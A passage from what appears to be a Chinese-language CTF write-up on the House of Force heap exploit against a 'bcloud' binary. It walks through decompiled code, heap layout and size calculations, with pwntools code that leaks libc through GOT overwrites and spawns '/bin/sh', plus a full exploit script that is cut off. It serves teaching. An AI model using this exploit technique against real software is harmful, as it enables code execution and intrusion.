<h4 id="2-&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff"><a href="#2-&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff" class="headerlink" title="2.&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff"></a>2.&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff</h4><p>&#x5728;&#x8F93;&#x5165;Org&#x5904;&#xFF0C;&#x4E5F;&#x5B58;&#x5728;&#x540C;&#x6837;&#x7684;&#x95EE;&#x9898;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">input_org_host</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+60h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  iread((<span class="keyword">int</span>)&amp;v3, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)v2;</span><br><span class="line">  dword_804B148 = (<span class="keyword">int</span>)v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6CE8;&#x91CA;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E00;&#x4E9B;&#x53D8;&#x91CF;&#x7684;&#x4F4D;&#x7F6E;<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    v4      |  # ebp-0x14</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  </span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|  Host(v3)  |  # ebp-0x58</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|     v2     |  # ebp-0x5c</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|    ...     |  # &#x4E2D;&#x95F4;&#x6709;63&#x4E2A;&#x5355;&#x4F4D;&#x7684;&#x7A7A;&#x95F4;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|   Org(s)   |  # ebp-0x9c</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure></p>
<p>&#x5F53;&#x6211;&#x4EEC;Org&#x4E3A;64&#x4E2A;&#x5B57;&#x8282;&#x65F6;&#xFF0C;Org&#x7684;&#x7684;&#x622A;&#x65AD;&#x7B26;&#x2019;\x00&#x2019;&#x88AB;v2&#x622A;&#x65AD;&#xFF0C;&#x5F53;&#x6267;&#x884C;strcpy&#x51FD;&#x6570;&#x65F6;&#x4F1A;&#x5C06;Org&#x5F00;&#x59CB;&#x5230;Host&#x7ED3;&#x675F;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;v2&#x8FD9;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x5185;&#x5B58;&#x533A;&#x57DF;&#xFF0C;&#x800C;&#x6B64;&#x65F6;v2&#x662F;&#x8DDD;&#x79BB;topchunk&#x6700;&#x8FD1;&#x7684;chunk&#xFF0C;&#x4F46;&#x662F;&#x5176;chunkdata&#x5927;&#x5C0F;&#x53EA;&#x6709;0x40(64)&#xFF0C;&#x6240;&#x4EE5;&#x6267;&#x884C;<code>strcpy(v2, &amp;s);</code>&#x540E;&#xFF0C;v2&#x88AB;&#x8986;&#x76D6;&#x5230;&#x4E86;topchunk&#x7684;pprev_size&#x5904;&#xFF0C;Host(v3)&#x8986;&#x76D6;&#x5230;topchunk&#x7684;size&#x90E8;&#x5206;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;topchunk&#x7684;&#x5927;&#x5C0F;&#x4E3A;0xffffffff</p>
<h4 id="3-&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118"><a href="#3-&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118" class="headerlink" title="3.&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118"></a>3.&#x7533;&#x8BF7;&#x6B63;&#x786E;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x4FEE;&#x6539;topchun&#x7684;&#x6307;&#x9488;&#x5230;0x804b118</h4><p>&#x7B2C;&#x4E00;&#x6B65;&#x6CC4;&#x9732;&#x7684;&#x5806;&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;topchunk&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#x3002;&#x7B2C;&#x4E8C;&#x6B65;&#x4FEE;&#x6539;&#x4E86;topchunk&#x7684;size&#x4E3A;0xffffffff&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7533;&#x8BF7;&#x8DB3;&#x591F;&#x5927;&#x7684;chunk&#xFF0C;&#x8BA9;topchunk&#x7684;&#x6307;&#x9488;&#x6307;&#x5411;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9009;&#x62E9;0x804B118&#xFF0C;&#x4ECE;&#x4E0B;&#x9762;&#x4F2A;&#x4EE3;&#x7801;*&#x5904;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;0x804B120&#x5B58;&#x653E;&#x7684;&#x662F;&#x6BCF;&#x4E00;&#x4E2A;chunk&#x7684;&#x5806;&#x6307;&#x9488;&#x3002;&#x5F53;topchunk&#x6307;&#x9488;&#x4E3A;0x805b118&#x65F6;&#xFF0C;&#x65B0;&#x7533;&#x8BF7;&#x7684;chunk&#x7684;data&#x5730;&#x5740;&#x5C31;&#x662F;0x804b120&#x3002;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">newNote</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; dword_804B120[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:&quot;</span>);</span><br><span class="line">  v2 = sub_8048709();</span><br><span class="line">  dword_804B120[i] = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(v2 + <span class="number">4</span>); <span class="comment">//*</span></span><br><span class="line">  <span class="keyword">if</span> ( !dword_804B120[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  dword_804B0A0[i] = v2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  iread(dword_804B120[i], v2, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Create success, the id is %d\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x8981;&#x6B63;&#x786E;&#x8BA1;&#x7B97;&#x7533;&#x8BF7;&#x7684;chunk&#xFF0C;&#x8BA9;topchunk&#x6307;&#x9488;&#x6307;&#x5411;0x804B118&#xFF0C;&#x56E0;&#x4E3A;&#x9700;&#x8981;0x8&#x4E2A;&#x5B57;&#x8282;&#x5B58;&#x653E;precv_size&#x548C;size&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">note_list = <span class="number">0x804B120</span></span><br><span class="line">target_addr = note_list - <span class="number">0x8</span></span><br><span class="line">top_addr = leakheap_addr + <span class="number">0x40</span> + <span class="number">0x48</span> + <span class="number">0x48</span> + <span class="number">24</span></span><br><span class="line">log.success(<span class="string">&quot;top_addr: &quot;</span>+hex(top_addr))</span><br><span class="line">malloc_size = -(top_addr-target_addr) - <span class="number">0x4</span> <span class="number">-0x8</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_size: &quot;</span>+hex(malloc_size))</span><br><span class="line">newNote(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">newNote(malloc_size,<span class="string">&apos;cccc&apos;</span>)</span><br></pre></td></tr></table></figure></p>
<p>&#x6B64;&#x65F6;&#x7684;top_addr&#x662F;&#x5728;*&#x4E4B;&#x524D;&#x7684;topchunk&#x7684;&#x6307;&#x9488;&#xFF0C;&#x5176;&#x4E2D;0x40+0x48+0x48&#x662F;&#x4FDD;&#x5B58;name&#x3001;org&#x3001;host&#x7684;&#x5927;&#x5C0F;</p>
<h5 id="glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;"><a href="#glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;" class="headerlink" title="glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;"></a>glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x8FDB;&#x884C;&#x8C03;&#x6574;</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>
<p>&#x5176;&#x4E2D;&#x5728;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0B;SIZE_SZ=4&#xFF0C;MALLOC_ALIGN_MASK=8-1=7</p>
<p>&#x6240;&#x4EE5;newNote(0x10,&#x2019;aaaa&#x2019;)&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x7684;&#x64CD;&#x4F5C;&#x4E3A;malloc(0x10+4)&#x5373;malloc(0x14)&#xFF0C;0x14&#x4E0D;&#x662F;8&#x7684;&#x500D;&#x6570;&#xFF0C;&#x901A;&#x8FC7;<code>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</code>&#x8BA1;&#x7B97;&#x771F;&#x6B63;&#x5206;&#x914D;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF0C;&#x800C;glibc&#x4E2D;&#x6E90;&#x7801;&#x6709;&#x4E00;&#x6BB5;&#x6CE8;&#x91CA;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span></span><br><span class="line"><span class="comment"> MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&apos;ed area is page</span></span><br><span class="line"><span class="comment">aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span></span><br></pre></td></tr></table></figure></p>
<p>&#x6240;&#x4EE5;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x4E3A;<code>((0x14) + 4 + 7) &amp; ~7) = 24</code>&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x52A0;24&#xFF0C;&#x6709;&#x4E86;topchunk&#x7684;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x5230;&#x5E95;&#x8BE5;&#x7533;&#x8BF7;&#x591A;&#x5C11;&#x5185;&#x5B58;&#xFF0C;&#x4F1A;&#x8BA9;topchunk&#x6307;&#x9488;&#x6307;&#x5411;0x804b118</p>
<p><code>malloc_size = -(top_addr-target_addr) - 0x4 -0x8</code>&#xFF0C;&#x7533;&#x8BF7;&#x6B63;&#x7684;size&#x4F1A;&#x62AC;&#x9AD8;topchunk&#x6307;&#x9488;&#xFF0C;&#x53CD;&#x4E4B;&#xFF0C;&#x56E0;&#x6B64;&#x52A0;&#x4E2A;&#x8D1F;&#x53F7;<code>-(top_addr-target_addr)</code></p>
<p>-0x4&#x662F;&#x4E3A;&#x4E86;&#x62B5;&#x6D88;&#x7A0B;&#x5E8F;&#x4E2D;&#x7684;<code>(int)malloc(v2 + 4)</code>&#xFF0C;-0x8&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x65F6;glibc&#x4F1A;&#x5BF9;&#x7533;&#x8BF7;&#x7684;&#x5927;&#x5C0F;&#x52A0;&#x4E0A;2*SIZE_SZ&#xFF0C;&#x586B;&#x5145;chunkhead&#x3002;</p>
<h4 id="4-&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;"><a href="#4-&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;" class="headerlink" title="4.&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;"></a>4.&#x6CC4;&#x9732;libc&#x4E2D;&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;</h4><p>&#x901A;&#x8FC7;&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x5806;&#x6307;&#x9488;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x901A;&#x8FC7;editNote&#x51FD;&#x6570;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x5806;&#x6307;&#x9488;&#x3002;</p>
<p>&#x7A0B;&#x5E8F;&#x4E2D;&#x6CA1;&#x6709;&#x6253;&#x5370;chunkdata&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x3002;&#x6211;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x5C06;free&#x51FD;&#x6570;&#x4FEE;&#x6539;&#x4E3A;print&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6253;&#x5370;&#x51FA;chunkdata&#x7684;&#x5185;&#x5BB9;&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&apos;free&apos;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&apos;atoi&apos;</span>])</span><br><span class="line">newNote(<span class="number">0x100</span>,payload)</span><br><span class="line">editNote(<span class="number">0</span>,p32(elf.symbols[<span class="string">&apos;printf&apos;</span>]))</span><br><span class="line">deleteNote(<span class="number">1</span>)</span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&apos;Delete success.&apos;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line">log.success(<span class="string">&apos;atoi_addr: &apos;</span>+hex(atoi_addr))</span><br></pre></td></tr></table></figure></p>
<p>&#x7B2C;&#x4E00;&#x4E2A;&#x5806;&#x6307;&#x9488;&#x5199;&#x4E3A;free@got&#xFF0C;&#x7B2C;&#x4E8C;&#x7B2C;&#x4E09;&#x5806;&#x6307;&#x9488;&#x5199;&#x4E3A;atoi@got&#xFF0C;&#x5C06;free@got&#x5199;&#x4E3A;print@plt&#xFF0C;<code>deleteNote(1)</code>&#x65F6;&#x4F1A;&#x6253;&#x5370;&#x51FA;atoi&#x5728;libc&#x7684;&#x5730;&#x5740;&#x3002;</p>
<h4 id="5-&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;"><a href="#5-&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;" class="headerlink" title="5.&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;"></a>5.&#x8BA1;&#x7B97;system&#x7684;&#x5730;&#x5740;</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">&apos;atoi&apos;</span>]</span><br><span class="line">log.success(<span class="string">&apos;libc_addr: &apos;</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">log.success(<span class="string">&apos;system_addr: &apos;</span>+hex(system_addr))</span><br></pre></td></tr></table></figure>
<p>####6.get shell<br>&#x6709;&#x4E86;system&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x53C8;&#x6709;&#x53EF;&#x63A7;&#x6307;&#x9488;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5C06;atoi@got&#x5199;&#x4E3A;system&#x51FD;&#x6570;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x4F20;&#x5165;&#x2019;/bin/sh;&#x2019;&#x5C31;&#x53EF;&#x4EE5;get shell&#x3002;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">editNote(<span class="number">2</span>,p32(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&apos;option---&gt;&gt;&apos;</span>)</span><br><span class="line">p.sendline(<span class="string">&apos;/bin/sh;&apos;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="0x03-&#x603B;&#x7ED3;"><a href="#0x03-&#x603B;&#x7ED3;" class="headerlink" title="0x03 &#x603B;&#x7ED3;"></a>0x03 &#x603B;&#x7ED3;</h3><p>&#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x51FA;House of Force&#x7684;&#x5229;&#x7528;&#x6761;&#x4EF6;</p>
<ul>
<li>&#x53EF;&#x4EE5;&#x4FEE;&#x6539;topchunk&#x7684;size</li>
<li>malloc(size)&#x4E2D;&#x7684;size&#x53EF;&#x63A7;</li>
</ul>
<h3 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04 EXP"></a>0x04 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./bcloud&apos;</span>)</span><br><span class="line">elf = ELF(<span class="string">&apos;./bcloud&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context.log_level = <span class="string">&apos;debug&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newNote</span><span class="params">(length,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the length of the note content:&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the content:&apos;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editNote</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the id:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the new content:\n&apos;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Edit success.&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;---&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input the id:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment">#step1. leak heap address</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Input your name:&apos;</span>)</span><br><span class="line">	p.send(<span class="string">&apos;a&apos;</span>*<span class="number">0x38</span>+<span class="string">&apos;b&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;b&apos;</span>*<span class="number">8</span>)</span><br><span class="line">	leakheap_addr = u32(p.read(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step2. set topchunk&apos;s size is -1</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Org:&apos;</span>)</span><br><span class="line">	p.send(<span class="string">&apos;b&apos;</span>*<span class="number">0x40</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Host:&apos;</span>)</span><br><span class="line">	p.send(p32(<span class="number">0xffffffff</span>)+<span class="string">&apos;\n&apos;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#step3. alter the topchunk pointer to the target_addr(0x804b118)</span></span><br><span class="line">	note_list = <span class="number">0x804B120</span></span><br><span class="line">        target_addr = note_list - <span class="number">0x8</span></span><br><span class="line">        top_addr = leakheap_addr + <span class="number">0x40</span> + <span class="number">0x48</span> + <span class="number">0x48</span> + <span class="number">24</span></span><br><span class="line">        log.success(<span class="string">&quot;top_addr: &quot;</span>+hex(top_addr))</span><br><span class="line">	malloc_size = -(top_addr-target_addr) - <span class="number">0x4</span> <span class="number">-0x8</span></span><br><span class="line">	log.success(<span class="string">&quot;malloc_size: &quot;</span>+hex(malloc_size))</span><br><span class="line">	newNote(<span class="number">0x10</span>,<span class="string">&apos;aaaa&apos;</span>)</span><br><span class="line">	newNote(malloc_size,<span 